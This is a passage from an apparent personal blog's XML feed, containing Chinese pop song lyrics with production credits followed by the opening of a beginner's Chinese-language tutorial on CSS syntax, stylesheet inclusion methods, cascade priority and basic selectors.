让人难忘
我多风光 你别闯入我围墙
你要什么真相 不就图个皮囊
不如 让我 留在橱窗
我多难忘 像秀色可餐的模样
感谢你又打赏 你用词越恰当
我越膨胀
我的疯狂 连我自己都看不上
阴里怪气的愿望 那屈辱的轻伤
谁能给我 发个奖章
我多向往 有个美丽的地方
我最初的模样 没痛也不会痒
能把赏赐 都烧光
编曲：周以力
大提琴：郎莹
鼓：尹森
贝斯：陈然然
吉他：张凇</font>

<p>&nbsp;<br>&nbsp;<br>&nbsp;</p>
<h6 id="《骆驼》"><a href="#《骆驼》" class="headerlink" title="《骆驼》"></a><center><font face="楷体">《骆驼》</font></h6><center><font face="楷体">
作曲 : 郭顶
作词 : 甘世佳
是什么在召唤着我提醒我
我懦弱过犹豫过
若我能挣脱那绳索
旁若无人见我来议论我
我是骆驼没见过最美的沙漠
井里的青蛙劝我别相信候鸟胡说
我心里有片沙漠
那里有很多骆驼
不再寂寞会围绕着我陪我说说
我心里有片沙漠
点缀着森林湖泊
雨季一过有我爱吃的小水果
我终于挣脱了绳索从不曾
这么自在过轻松过
我决定找回骆驼的生活
不要再跟着我再骑着我
沿途云朵趁没人看见就降落
提醒着我再往前就从没人出去过
转眼就看见沙漠
那里有没有骆驼
在期待我它是否在哪偷偷看我
明明就来到沙漠
为何看不到骆驼
是不是说我来的不是时候
原来这就是沙漠
本来就没有骆驼
负责地说那什么是我什么是我
全世界都是沙漠
人心里住着骆驼
你就当做 我根本没有来过 来过
都怪我亲手杀了骆驼
制作人：郭顶
编曲：陈迪
吉他：陈迪 郭顶
贝斯：陈迪
鼓：Hayato
录音：汝文博 At Big J Studio
混音：卢楠 At Megawave Studio BJ
母带：Ryan Smith At Sterling Sound NYC</font>

<p>&nbsp;<br>&nbsp;<br>&nbsp;</p>
<h6 id="《别》"><a href="#《别》" class="headerlink" title="《别》"></a><center><font face="楷体">《别》</font></h6><center><font face="楷体">
作曲 : 薛之谦
作词 : 薛之谦
别犹豫 别偶遇 别相遇
别一个人去看喜剧
别继续 别比喻 别治愈
别让人看出你有多委屈
别下雨 别下去 别多余
别以为他还会为你淋雨
别几句 就离去 别离去
别让他听见你最后一句
别坦白 别让故事精彩
别不安 只是还有习惯
别喜欢 我长期的勇敢
别揭穿 我唯一的遗憾
别允许 别也许 别参与
别自己和自己过不去
别一句 又一句 别造句
别让人笑话你的遭遇
别坦白 别让故事精彩
别不安 只是还有习惯
别喜欢 我长期的勇敢
别揭穿 我唯一的遗憾
别垄断 我想你的夜晚
别刺穿 我包裹的不堪
别交代 我爱你的病态
多草率 除了你都不爱
别犹豫 别偶遇 别相遇....
制作人：郑伟
编曲：郑伟
混音：郑伟
合音：薛之谦
弦乐：上海piao音弦乐团
人声录制：吴身宝（soundhub studio）
弦乐录制：莫家伟（上海广播大厦200studio）
母带：Chris Gehringer</font>

<p>&nbsp;<br>&nbsp;<br>&nbsp;</p>
<h6 id="《火星人来过》"><a href="#《火星人来过》" class="headerlink" title="《火星人来过》"></a><center><font face="楷体">《火星人来过》</font></h6><center><font face="楷体">
作曲 : 韩星洲
作词 : 薛之谦
我在听新闻里面说 他们曾来过
火星人的心脏靠左
我们也曾听大人说 他没有管我
他们一定看见什么过
森林不在 动物减半
人们拍照 留念那些 飞机残骸
妻离子散 空袭灾难
那些不敢 谈政治的 都去避难
被遗弃的小孩 搀扶那颗炸弹
他父母被人用枪指着头要答案
若要停战 先要谈判
这一片片 荒凉土地幕后到底谁管
如果钢铁都燃起火
看城市多折磨
请你配合我 一起难过
假如猿人没点起火
我们回到那生活
你是否救得回刚离群的我
火星人来过
火星人来过
火星人救我
火星人救我
火星人救我
火星人爱我
其实我们也忏悔过借口都好说
可以怪我心脏偏左
有些领袖话音刚落也会很难过
因为会议迟迟通不过
舍利不在象牙贩卖
人们认为贫穷可以卖掉小孩
钻石太窄富人不爱
还在楼顶挥霍那些仿真钱财
反正这没战乱也没有什么天灾
我管他谁让瘟疫艾滋继续泛滥
这种心态还能表态
毕竟这是个打字不用负责任的年代
如果欲望都燃起火
怎么自私怎么活
请你举起手假装难过
假如猿人没点起火
我们回到那生活
你是否劝得住开第一枪的我
假如有第三次战火
让地核接近我
你别难过请抱紧我
如果你不能说服我
就请你瞄准我
你听地球刚哭过
地球刚哭过
地球有话说
地球好脆弱
火星人救我
火星人救我
火星人来过...
制作人 : 韩星洲
编曲 : 韩星洲
混音 : 赵靖</font>

<p>&nbsp;<br>&nbsp;<br>&nbsp;</p>
<h6 id="《背过手》"><a href="#《背过手》" class="headerlink" title="《背过手》"></a><center><font face="楷体">《背过手》</font></h6><center><font face="楷体">
作曲 : 薛之谦
作词 : 薛之谦
花被人摘走
心被虫吸走
我一无所有
错过盛开的时候
皮被刀割走
枝被鹿捡走
树从不开口
破土后哪来的自由
无奈的请背过手 在缝里等野果成熟
无辜的人松了手 反正那背负都雷同
梦被人抢走
字被人偷走
别攥着拳头
最多解开粒领扣
风劝云别走
海将河推走
爱上就别低头
骄傲的自作自受
无奈的请背过手 在梦里等斑驳轻舟
无辜的人松了手 反正那背负都雷同
无奈了请放下手 等野草会出卖墙头
无耻的人伸出手 跪多久能换来富有
生劝死别走 魂被肉死守
尽量别张口 满足狼的胃口
等怂恿的烫了手
等看懂的还我自由
制作人：郑伟
编曲：宋涛
混音：赵靖 Big J Studio
女声：莫宇微
合音：薛之谦
吉他：宋涛
贝斯：韩阳
鼓：武勇恒（贝贝）
人声录制：莫家伟（上海广播大厦200studio）
女声、合音录制：汝文博 Bjg J Studio
吉他、贝斯录制：汝文博 Big J Studio
鼓录制：李游 55Tec Studio
母带制作：Chris Gehringer</font>

<p>&nbsp;<br>&nbsp;<br>&nbsp;</p>
<h6 id="《渡》"><a href="#《渡》" class="headerlink" title="《渡》"></a><center><font face="楷体">《渡》</font></h6><center><font face="楷体">
中文词：薛之谦
原词曲：Torbjorn Brundtland，Svein Berge
渡人去的夜 用稀有的火焰
照亮了胆怯 燃尽我语言
亏欠都是磁铁 也不能被降解
都想赎去罪孽 再偷偷的怀念
有人在妥协 有人拼命在狡辩
人设太可怜 希望你谅解
都在散播细节 肢体在蔓延
都想要张新脸 骨肉别相连
渡人去的夜 船离开了湖面
过程很简洁 根本没人能幸免
你会坠入深渊 还是不断盘旋
别被渡人听见 你还有所留恋
制作人：郑伟
编曲：Torbjorn Brundtland， Svein Berge
混音：郑伟
合音：薛之谦
人声录制：莫家伟（上海广播大厦200studio），吴身宝（soundhub studio）
母带制作：Chris Gehringer
</font>

<p>&nbsp;<br>&nbsp;<br>&nbsp;</p>
<h6 id="《我害怕》"><a href="#《我害怕》" class="headerlink" title="《我害怕》"></a><center><font face="楷体">《我害怕》</font></h6><center><font face="楷体">
作词：薛之谦
作曲：薛之谦
我害怕你的消息
不经意被谁提起
像曾贴着我耳边的气息
我害怕某个旋律
带我回某个场景
你说如果雨停了我们就在一起
我害怕某条街道
有你留下的记号
会自以为是你对我的需要</font>
<center><font face="楷体">
我害怕那段旅行
继续在我的梦里
我还相信你说的
离开的原因
最近我
表现的还可以
最近你
已走到了哪里
别在意
随便问问而已
都怪我
才学会了爱情</font>
<center><font face="楷体">
我害怕整理行李
我害怕关灯休息
我害怕揉揉眼睛
就错过了你
我害怕人潮密集
我害怕山川小溪
我害怕我在附近
却找不到你
如果我
掉入了海底
是否你
会有一丝感应
别在意
随便说说而已
别有压力
我只想见见你</font>
<center><font face="楷体">
我害怕你的呼吸
我害怕太近距离
我害怕别人提到你的秘密</font>
<center><font face="楷体">
编曲：张宝宇
混音：郑伟
合音：薛之谦
吉他手：宋宇
母带：郑伟
录音：莫家伟
录音棚：上海广播大厦200studio
</font>

<p>&nbsp;<br>&nbsp;<br>&nbsp;</p>
]]></content>
      <categories>
        <category>音乐</category>
      </categories>
  </entry>
  <entry>
    <title>薛之谦-《肆无忌惮》专辑</title>
    <url>/post/%E8%96%9B%E4%B9%8B%E8%B0%A6-%E3%80%8A%E8%82%86%E6%97%A0%E5%BF%8C%E6%83%AE%E3%80%8B%E4%B8%93%E8%BE%91/</url>
    <content><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="//music.163.com/outchain/player?type=2&id=557581967&auto=0&height=66"></iframe>

<center><font face="楷体">
作曲 : 张洢豪
作词 : 薛之谦
角色精湛 主题略荒诞
理由太短 是让人不安
疑信参半 却无比期盼
你的惯犯 圆满
别让纠缠 显得 孤单
你肆无忌惮 你急着闹翻
用词刁钻 要观后感
爱本是两端 要倾斜不难 要摧毁简单
我顺其自然 我表现勇敢
补缺填满 随意调侃
爱会变习惯 维护者喜欢 自愈的快感
理由丰满 角色越骨感
染上情感 退让都不谈
承载过半 还奋力纠缠
你的预判 圆满
我尽量延缓 胡闹狂欢
你肆无忌惮 你急着闹翻
用词刁钻 要观后感
爱本是两端 要倾斜不难 要摧毁简单
我违背自然 我表演勇敢
宁缺勿滥 严加看管
无用的手段 维护者习惯 让自己难堪
最后的离散 请用词温暖
制作人：张洢豪
编曲： 张洢豪、Eric Juu
木吉他：张洢豪
电吉他：Derrick Sepnio
钢琴：Eric Juu
Bass：Rayvaughn Covington
鼓：Padget Nanton III
合声：薛之谦
人声录制：汝文博@BIG.J Studio
乐器录制：Tsang Yat Lung@Non Sound Studio
混音：赵靖@BIG.J Studio
母带：全相彦@OK Mastering Studio
</font>

<p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p>
]]></content>
      <categories>
        <category>音乐</category>
      </categories>
  </entry>
  <entry>
    <title>薛之谦-《那是你离开了北京的生活》专辑</title>
    <url>/post/%E8%96%9B%E4%B9%8B%E8%B0%A6-%E3%80%8A%E9%82%A3%E6%98%AF%E4%BD%A0%E7%A6%BB%E5%BC%80%E4%BA%86%E5%8C%97%E4%BA%AC%E7%9A%84%E7%94%9F%E6%B4%BB%E3%80%8B%E4%B8%93%E8%BE%91/</url>
    <content><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="//music.163.com/outchain/player?type=2&id=571340283&auto=0&height=66"></iframe>

<center><font face="楷体">
作曲 : 方毅
作词 : 薛之谦
试着留盏灯假装陪伴失眠的我
窗口就有等待的效果
已经习惯摆放好两人份的餐桌
这样看上去就不寂寞
那是你离开了北京的生活
街上的人偶尔会模仿你小动作
轻而易举就能将我击破
那些承诺提起人是你 还是我
那是你离开了北京的生活
我以为我爱了 就会留下些什么 纪念那些曲折
我们快乐的争吵的不舍的分分合合
我还是撑着 不说 我应该平静的
面对你离开了北京的生活
是否有人在对街窥探我的生活
督促我别过的不快乐
一晃而过看不清的是你 还是我
那是你离开了北京的生活
我以为我疯了 你在提醒我什么 别再故意招惹
那些爱过的 美好的 快乐的 不是施舍
我还是撑着 不说 我可以平静的
接受你离开了北京的生活
我以为是规则 失去最爱的一个 才能记忆深刻
那些 幼稚的 轻狂的 勇敢的 从此收着
我还在羡慕什么 街上哭的那个
你却无比希望他抱住另一个
那是你离开了北京的生活
制作人：方毅
编曲：茶茶
木吉他：郭一凡
电吉他：劳国贤
贝斯：韩阳
鼓手：武勇恒
和声：方毅
和声设计：茶茶 方毅
弦乐团：国际首席爱乐乐团
弦乐监制：胡静成
弦乐录音师：王小四
弦乐录音室：金田录音棚
乐器录音师：邢铜
乐器录音室：55TEC Studio
人声录音师：汝文博
人声录音室：BIG.J Studio
混音师：赵靖
混音室：BIG.J Studio
母带：全相彦@OK Mastering Studio
</font>

<p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p>
]]></content>
      <categories>
        <category>音乐</category>
      </categories>
  </entry>
  <entry>
    <title>CSS 基础</title>
    <url>/post/HTML-CSS/</url>
    <content><![CDATA[<p>hhh… ( ⸝⸝•ᴗ•⸝⸝ )੭⁾⁾</p>
<a id="more"></a>

<br />

<br />

<center><font color="#00B2EE" face="Comic sans MS" size=5>CSS 基础</font> </center>


<br />

<br />





<h3 id="一-CSS-初识"><a href="#一-CSS-初识" class="headerlink" title="一. CSS 初识"></a><font color="#FF6347" face="Comic sans MS">一. CSS 初识</font></h3><br />


<p><font face="Microsoft YaHei"><strong>CSS是给HTML标记加的样式；JS是给HTML标记加的行为。HTML标记是最先出现的。</strong></font></p>
<blockquote>
<ol>
<li>CSS是什么?</li>
<li>为什么要使用CSS?</li>
<li>CSS和HTML是什么关系？</li>
<li>CSS应该怎样使用？</li>
</ol>
</blockquote>
<br />


<p><font color="#00B2EE"><strong>1. CSS是什么?</strong></font></p>
<ol>
<li><p>CSS（Cascading Stylesheets，层叠样式表）。</p>
</li>
<li><p><strong>CSS的主要目的：是</strong><font color="#FF7F00"><strong>给HTML标记添加各种各样的表现(格式、样式)</strong></font>。比如：文字样式、背景、文本样式、链接样式。</p>
</li>
<li><p>是一种制作网页的新技术，现在已经为大多数的浏览器所支持，成为网页设计必不可少的工具之一。使用CSS能够简化网页的格式代码，加快下载显示的速度，也减少了需要上传的代码数量，大大减少了重复劳动的工作量。尤其是当你面对的是有数百个网页的站点时，CSS简直象是神对我们的恩赐！</p>
</li>
</ol>
<br />

<p><font color="#00B2EE"><strong>2. 为什么要使用CSS?</strong></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>HTML</strong>超文本标注语言</font>：各种HTML标记。<br><font color="#FF7F00"><strong>CSS</strong>层叠样式表</font>：给HTML标记加的样式。<br><font color="#FF7F00"><strong>JavaScript</strong>脚本程序</font>：给HTML标记加的程序。</p>
</blockquote>
<p>   W3C（The World Wide Web Consortium）把动态HTML（Dynamic HTML）分为三个部分来实现：脚本语言（包括javascript、Vbscript等）、支持动态效果的浏览器（包括Internet Explorer、Netscape Navigator等）和CSS样式表。</p>
<br />

<p><font color="#00B2EE"><strong>3. CSS和HTML是什么关系？</strong></font></p>
<p><strong>CSS的主要目的：是</strong><font color="#FF7F00"><strong>给HTML标记添加各种各样的表现(格式、样式)</strong></font>。比如：文字样式、背景、文本样式、链接样式。</p>
<br />

<p><font color="#00B2EE"><strong>4. CSS应该怎样使用？</strong></font></p>
<blockquote>
<ol>
<li>在HTML标签中直接使用。</li>
<li>在HTML标签先定义属性id或者class，然后在**<code>&lt;head&gt;&lt;/head&gt;</code>**定义一个样式表来表现这个属性id或者class。</li>
</ol>
</blockquote>
<p>CSS注释以 <strong><code>/*</code></strong> 开始, 以 <strong><code>*/</code></strong>  结束, 实例如下:</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*这是个注释*/</span></span><br><span class="line"><span class="selector-tag">p</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="attribute">text-align</span>:center;</span><br><span class="line"><span class="comment">/*这是另一个注释*/</span></span><br><span class="line"><span class="attribute">color</span>:black;</span><br><span class="line"><span class="attribute">font-family</span>:arial;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br />

<br />



<h3 id="二-CSS-框架"><a href="#二-CSS-框架" class="headerlink" title="二. CSS 框架"></a><font color="#FF6347" face="Comic sans MS">二. CSS 框架</font></h3><p>CSS 规则由两个主要的部分构成：选择器，以及一条或多条声明</p>
<p><img data-src="https://i.loli.net/2019/03/10/5c84f57ee276a.png" alt="1.png"></p>
<br />

<p><font color="#FF7F00"><strong>选择器：</strong></font>就是选择HTML标记，换句话说：就是给哪个HTML标记加样式。<br><font color="#FF7F00"><strong>格式声明语句：</strong></font>由**<code>&#123; &#125;</code><strong>构成，</strong><code>&#123; &#125;</code><strong>中每条声明由</strong><code>属性名:属性值;</code>**构成。</p>
<p><font color="#FF7F00"></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>注意：</strong></font></p>
</blockquote>
<ol>
<li>每个属性有一个值，属性和值被冒号**<code>:</code><strong>分开。属性和属性之间用英文分号</strong><code>；</code><strong>隔开。最后以分号</strong><code>；</code>**结束。</li>
<li>属性值，一个属性名可以取不同的值，这个值不加引号。</li>
<li>CSS中的数字单位都是**<code>px</code><strong>，这个</strong><code>px</code>**不能省略。</li>
</ol>
<br />

<h4 id="2-1-CSS-样式"><a href="#2-1-CSS-样式" class="headerlink" title="2.1 CSS 样式"></a><font color="#3CB371" face="Comic sans MS">2.1 CSS 样式</font></h4><p>要想在浏览器中显示出预期的CSS样式表效果，就要让浏览器识别并正确调用CSS。当浏览器读取样式表时，要依照文本格式来读，这里介绍四种在页面中插入CSS样式表的方法：<strong>链入外部样式表、内部样式表、导入外部样式表和内联样式</strong>。</p>
<br />

<h5 id="1-链入外部样式表"><a href="#1-链入外部样式表" class="headerlink" title="1. 链入外部样式表"></a><font color="#00B2EE" face="Microsoft YaHei">1. 链入外部样式表</font></h5><p><strong>链入外部样式表：</strong>是把样式表（选择器+声明）保存为一个样式表**<code>.css</code><strong>文件，然后在页面中用</strong><code>&lt;link&gt;</code><strong>标记来链接到这个样式表文件，这个</strong><code>&lt;link&gt;</code><strong>标记必须放到页面的</strong><code>&lt;head&gt;...&lt;/head&gt;</code>**区内。</p>
<p>如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt; </span><br><span class="line"></span><br><span class="line">…… </span><br><span class="line">&lt;link href=<span class="string">&quot;mystyle.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> media=<span class="string">&quot;all&quot;</span>&gt; </span><br><span class="line">…… </span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure>

<br />

<blockquote>
<p>上面这个例子表示浏览器从mystyle.css文件中以文档格式读出定义的样式表。<br>**<code>href=&quot;mystyle.css&quot;</code>**是文件所在的位置。<br>**<code>rel=&quot;stylesheet&quot;</code>**是指在页面中使用这个外部的样式表。rel 属性规定当前文档与被链接文档之间的关系。<br>**<code>type=&quot;text/css&quot;</code>**是指文件的类型是样式表文本。<br>**<code>media</code>**是选择媒体类型，这些媒体包括：屏幕，纸张，语音合成设备，盲文阅读设备等。</p>
</blockquote>
<p>　　<font color="#FF7F00"><strong>一个外部样式表文件可以应用于多个页面</strong></font>。当你改变这个样式表文件时，所有页面的样式都随之而改变。在制作大量相同样式页面的网站时，非常有用，不仅减少了重复的工作量，而且有利于以后的修改、编辑，浏览时也减少了重复下载代码。</p>
<blockquote>
<p><font color="#FF7F00"><strong>注意：</strong></font><br>样式表文件可以用任何文本编辑器（例如：记事本）打开并编辑，一般样式表文件扩展名为.css。内容是定义的样式表，不包含HTML标记，mystyle.css这个文件的内容如下：</p>
</blockquote>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">hr</span> &#123;<span class="attribute">color</span>: sienna&#125; </span><br><span class="line"></span><br><span class="line"><span class="selector-tag">p</span> &#123;<span class="attribute">margin-left</span>: <span class="number">20px</span>&#125; </span><br><span class="line"></span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;images/back40.gif&quot;</span>)&#125; </span><br><span class="line"><span class="comment">/*定义水平线的颜色为土黄；段落左边的空白边距为20象素；页面的背景图片为images目录下的back40.gif文件*/</span></span><br></pre></td></tr></table></figure>

<br />

<h5 id="2-内部样式表"><a href="#2-内部样式表" class="headerlink" title="2. 内部样式表"></a><font color="#00B2EE" face="Microsoft YaHei">2. 内部样式表</font></h5><p><strong>内部样式表：</strong>是把样式表放到页面的**<code>&lt;head&gt;...&lt;/head&gt;</code><strong>区里，这些定义的样式就应用到页面中了，样式表是用</strong><code>&lt;style&gt;&lt;/style&gt;</code>**标记插入的。</p>
<p>从下例中可以看出&lt;style&gt;&lt;/style&gt;标记的用法：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">head</span>&gt; </span><br><span class="line">…… </span><br><span class="line">&lt;style type=&quot;text/css&quot;&gt; </span><br><span class="line"><span class="selector-tag">hr</span> &#123;<span class="attribute">color</span>: sienna&#125; </span><br><span class="line"><span class="selector-tag">p</span> &#123;<span class="attribute">margin-left</span>: <span class="number">20px</span>&#125; </span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;images/back40.gif&quot;</span>)&#125; </span><br><span class="line">&lt;/style&gt; </span><br><span class="line">…… </span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure>

<br />

<h5 id="3-导入外部样式表"><a href="#3-导入外部样式表" class="headerlink" title="3. 导入外部样式表 "></a><font color="#00B2EE" face="Microsoft YaHei">3. 导入外部样式表 </font></h5><p><strong>导入外部样式表：</strong>是指<font color="#FF7F00"><strong>在内部样式表的<code>&lt;style&gt;&lt;/style&gt;</code>里导入一个外部样式表</strong></font>，导入时用**<code>@import</code>**。</p>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt; </span><br><span class="line">…… </span><br><span class="line">&lt;style type=<span class="string">&quot;text/css&quot;</span>&gt; </span><br><span class="line">&lt;!-- </span><br><span class="line">@import <span class="string">&quot;mystyle.css&quot;</span> </span><br><span class="line">其他样式表的声明 </span><br><span class="line">--&gt; </span><br><span class="line">&lt;/style&gt; </span><br><span class="line">…… </span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure>

<br />

<p>例中**<code>@import &quot;mystyle.css&quot;</code><strong>表示导入mystyle.css样式表，注意使用时外部样式表的路径。方法和链入样式表的方法很相似，但导入外部样式表输入方式更有优势。实质上<font color="#FF7F00">**它相当于存在内部样式表中的</strong></font>。 </p>
<p><font color="#FF7F00"><strong>注意：</strong></font>导入外部样式表必须在样式表的开始部分，在其他内部样式表上面。</p>
<p><font color="#FF7F00"></font></p>
<br />

<h5 id="4-内联样式"><a href="#4-内联样式" class="headerlink" title="4. 内联样式"></a><font color="#00B2EE" face="Microsoft YaHei">4. 内联样式</font></h5><p><strong>内联样式：</strong>是混合在HTML标记里使用的，用这种方法，可以很简单的对某个元素单独定义样式。内联样式的使用是<font color="#FF7F00"><strong>直接将在HTML标记里加入style参数</strong></font>。而style参数的内容就是CSS的属性和值</p>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;p style=<span class="string">&quot;color: sienna;margin-left: 20px;&quot;</span>&gt; </span><br><span class="line"></span><br><span class="line">这是一个段落 </span><br><span class="line"></span><br><span class="line">&lt;/p&gt; </span><br><span class="line">&lt;!--这个段落颜色为土黄，左边距为<span class="number">20</span>象素--&gt;</span><br></pre></td></tr></table></figure>

<br />

<p>在style参数后面的引号里的内容相当于在样式表大括号里的内容。 </p>
<p><font color="#FF7F00"><strong>注意：</strong></font><strong>style参数可以应用于任意BODY内的元素（包括BODY本身）</strong>，除了BASEFONT、PARAM和SCRIPT。</p>
<p><font color="#FF7F00"></font></p>
<br />

<h5 id="5-多重样式表叠加的优先级"><a href="#5-多重样式表叠加的优先级" class="headerlink" title="5. 多重样式表叠加的优先级"></a><font color="#00B2EE" face="Microsoft YaHei">5. 多重样式表叠加的优先级</font></h5><p>CSS样式表有层叠顺序，这里我们讨论插入样式表的这几种方法的叠加，如果在同一个选择器上使用几个不同的样式表时，这个属性值将会叠加几个样式表，<font color="#FF7F00"><strong>遇到冲突的地方会以最后定义的为准</strong></font>。例如，我们首先<strong>链入</strong><code>&lt;link&gt;</code><strong>一个外部样式表</strong>，其中定义了**<code>h3</code><strong>选择符的</strong><code>color</code><strong>、</strong><code>text-alig</code><strong>和</strong><code>font-size</code>**属性：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">h3</span> </span><br><span class="line">&#123; </span><br><span class="line"><span class="attribute">color</span>: red; </span><br><span class="line"><span class="attribute">text-align</span>: left; </span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">8pt</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">/*标题3的文字颜色为红色；向左对齐；文字尺寸为8号字*/</span></span><br></pre></td></tr></table></figure>

<p>然后在<strong>内部样式表</strong>里也定义了h3选择符的text-align和font-size属性：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">h3</span> </span><br><span class="line">&#123; </span><br><span class="line"><span class="attribute">text-align</span>: right; </span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">20pt</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">/*标题3文字向右对齐；尺寸为20号字*/</span></span><br></pre></td></tr></table></figure>

<p>那么这个页面叠加后的样式就是：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">color</span>: <span class="selector-tag">red</span>; </span><br><span class="line"></span><br><span class="line"><span class="selector-tag">text-align</span>: <span class="selector-tag">right</span>; </span><br><span class="line"></span><br><span class="line"><span class="selector-tag">font-size</span>: 20<span class="selector-tag">pt</span>; </span><br><span class="line"><span class="comment">/*文字颜色为红色；向右对齐；尺寸为20号字*/</span></span><br></pre></td></tr></table></figure>

<p>字体颜色从外部样式表里保留下来，而对齐方式和字体尺寸都有定义时，按照后定义的优先而依照内部样式表。</p>
<br />

<p><font face="Microsoft YaHei"><strong>w3school给出的优先级顺序从低到高是：</strong></font><br>浏览器缺省设置<br>外部样式表<br>内部样式表（位于 &lt;head&gt; 标签内部）<br>内联样式（在 HTML 元素内部）</p>
<p>因此，内联样式（在 HTML 元素内部）拥有最高的优先权，这意味着它将优先于以下的样式声明： 标签中的样式声明，外部样式表中的样式声明，或者浏览器中的样式声明（缺省值）。<br>可参考：<font color="#00B2EE">《<a href="https://segmentfault.com/a/1190000005005091">css的样式优先级</a>》</font> </p>
<br />

<h4 id="2-2-CSS-选择器"><a href="#2-2-CSS-选择器" class="headerlink" title="2.2 CSS 选择器"></a><font color="#3CB371" face="Comic sans MS">2.2 CSS 选择器</font></h4><p>在 CSS 中，选择器是一种模式，用于选择需要添加样式的元素。<br>属性选择器可以根据元素的属性及属性值来选择元素。</p>
<p><strong>三种基本的选择器类型：</strong>标签名选择器、类选择器、ID选择器</p>
<p><font color="#FF7F00"><strong>注意：</strong></font>在标签内写入style=” “的方式，应该是CSS的一种引入方式，而不是选择器，因为根本就没有用到选择器。 </p>
<p><font color="#FF7F00"></font></p>
<h5 id="1-基本选择器"><a href="#1-基本选择器" class="headerlink" title="1. 基本选择器"></a><font color="#00B2EE" face="Microsoft YaHei">1. 基本选择器</font></h5><p><font face="Microsoft YaHei"><strong>（1）标签名选择器</strong></font></p>
<p>一个HTML文档中有许多标签，例如p标签，h1标签等。若要使文档中的所有p标签都使用同一个CSS样式，就应使用标签选择器。 </p>
<p><font color="#FF7F00"><strong>注意：</strong></font>CSS标签选择器，与HTML标签的名称一样，但不能加尖括号。</p>
<p>示例：</p>
<p><font color="#FF7F00"></font></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">head</span>&gt;</span><br><span class="line">    &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">       <span class="selector-tag">h1</span>&#123;</span><br><span class="line">         <span class="attribute">color</span>:red;</span><br><span class="line">         &#125;</span><br><span class="line">       <span class="selector-tag">p</span>&#123;</span><br><span class="line">         <span class="attribute">color</span>:blue;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure>


<br />

<p><font face="Microsoft YaHei"><strong>（2）类选择器</strong></font></p>
<ul>
<li><p>使用标签选择器可以为整个HTML文档中的同一个标签指定相同的CSS样式。但是在实际运用中，HTML文档中的同一个标签会被反复使用。若要为相同的标签赋予不同的CSS样式就应使用类选择器。 </p>
</li>
<li><p><font color="#FF7F00"><strong>描述：</strong></font>给一类HTML标签加样式。这里所指的“一类”是：每个HTML标签都有一个class属性，且class的值一样。class属性是公共属性，每个HTML标签都有。</p>
</li>
<li><p>类选择器的名称，必须以**<code>.</code><strong>开头，后限HTML标签的class属性的值。如：</strong><code>.box&#123; color:red; &#125;</code>**</p>
</li>
</ul>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">           &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">           &lt;title&gt;测试一下&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">           &lt;style type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">                .NO1&#123;</span><br><span class="line">                      color:red;</span><br><span class="line">                      background-color:<span class="comment">#88ff66;</span></span><br><span class="line">                    &#125;      <span class="comment">//无;或,号</span></span><br><span class="line">               .test&#123;</span><br><span class="line">     	              color:red;</span><br><span class="line">     	              border:<span class="number">1</span>px blue solid;</span><br><span class="line">     	            &#125; </span><br><span class="line">          &lt;/style&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1 class=&quot;NO1&quot;&gt;习近平心中的互联网&lt;/h1&gt;</span><br><span class="line">        &lt;div class=&quot;test&quot;&gt;测试代码&lt;/div&gt; </span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<br />

<blockquote>
<p>这种定义class 的方式是前端开发最常用的选择器，有几个突出的特点：可以给不同的标签设置同一个类，从而用一条CSS命令控制几个标签，减少大量代码，是页面修改简单，易维护，易改版；其次，后台工作人员机会不会用到有关class的相关设置，不需要跟后台人员之间进行交互；再者，可以通过js等动态改变标签的Classname，从而改变整个标签的样式，使前端动态效果实现起来更为容易。</p>
</blockquote>
<br />

<p><font face="Microsoft YaHei"><strong>（3）id选择器</strong></font></p>
<ul>
